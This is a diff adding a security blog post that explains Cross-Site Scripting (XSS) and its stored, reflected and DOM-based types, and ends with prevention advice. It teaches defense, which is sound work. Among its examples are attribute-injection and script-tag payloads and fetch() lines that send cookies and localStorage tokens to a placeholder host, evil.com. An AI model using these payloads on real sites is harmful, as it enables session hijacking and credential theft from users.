@@ -1,0 +1,91 @@
+---
+title: "Essential Things You Need to Know About XSS!"
+publishedAt: "2025-03-30"
+image: "/images/blogs/about-xss/thumbnails.png"
+summary: "In this blog post, I explain key Cross-Site Scripting (XSS) concepts with practical attack scenarios and security best practices to protect your web apps."
+tags: ["Security"]
+readTime: "8 min read"
+author: "Larry Vu"
+---
+
+## What is XSS?
+
+Cross-Site Scripting (XSS) is one of the most prevalent security vulnerabilities in web applications. It allows attackers to inject malicious client-side code (typically JavaScript) into web pages viewed by other users. This can lead to session hijacking, sensitive data theft, or unauthorized actions performed on behalf of the victim.
+
+Here is a straightforward and intuitive example:
+
+Imagine your web app allows users to change their profile picture by simply entering an image URL, saving you the hassle of storing and processing images on your server:
+
+```html
+<img src="{userInput}" />
+```
+
+An attacker discovers this behavior and tricks a victim or directly inputs a crafted malicious URL like this:
+
+```html
+https://example.com/evil.png" onerror="alert('XSS!')
+```
+
+Because `https://example.com/evil.png` does not exist or fails to load, the browser triggers the `onerror` event handler. The injected JavaScript executes immediately, displaying the `"XSS!"` alert popup.
+
+Instead of a harmless alert popup, an attacker could easily exfiltrate user session cookies or credentials to their remote command server:
+
+```html
+fetch('https://evil.com/steal-cookie?cookie=' + document.cookie)
+```
+
+Or if your application stores authentication tokens in web storage:
+
+```html
+fetch('https://evil.com/steal-token?token=' + localStorage.getItem('token'))
+```
+
+If you still store sensitive API keys, JWT access tokens, or session IDs in `localStorage` or `sessionStorage`, you are essentially handing them over to any script executing on that domain!
+
+---
+
+## Common Types of XSS
+
+1. **Stored XSS (Persistent XSS)**  
+   The malicious script is permanently stored on the target server (such as inside a database, comment field, or user profile). Whenever any user accesses the affected page, the malicious code executes in their browser.
+
+2. **Reflected XSS (Non-Persistent XSS)**  
+   The malicious script is reflected off the web server, typically through search queries, error messages, or URL parameters. The user must click a crafted link containing the malicious payload for the attack to succeed.
+
+3. **DOM-based XSS**  
+   The vulnerability exists entirely in client-side code. The browser executes malicious code due to unsafe DOM manipulation (e.g., `document.write`, `element.innerHTML`, `eval()`) without the payload ever needing to touch the backend server.
+
+---
+
+## How Can XSS Be Exploited?
+
+### Example Attack Scenario via Image `src` Attribute
+
+Suppose your web application accepts an image URL from user input and renders it directly into the template:
+
+```html
+<img src="{userInput}" />
+```
+
+If user input is not properly sanitized or encoded, an attacker could submit:
+
+```html
+"><script>alert('XSS')</script>
+```
+
+When rendered, the markup breaks out of the attribute and injects a script tag:
+
+```html
+<img src=""><script>alert('XSS')</script> />
+```
+
+The browser interprets and executes the `<script>` tag immediately, running whatever malicious payload the attacker supplied.
+
+---
+
+## How to Prevent XSS
+
+1. **Context-Aware Output Encoding:** Always escape user input before rendering it into HTML bodies, attributes, JavaScript variables, or URL parameters. Modern frameworks like React and Vue encode HTML by default (e.g., JSX `{variable}`).
+2. **Never Use Unsafe Sinks:** Avoid `dangerouslySetInnerHTML` in React or `v-html` in Vue unless the content has been rigorously sanitized with libraries like **DOMPurify**.
+3. **Use HttpOnly Cookies:** Store sensitive session tokens in `HttpOnly`, `Secure`, `SameSite` cookies so JavaScript running in the browser cannot read them via `document.cookie`.
+4. **Implement Content Security Policy (CSP):** Configure HTTP response headers with a strict CSP to restrict which domains can execute scripts and prevent inline script execution.
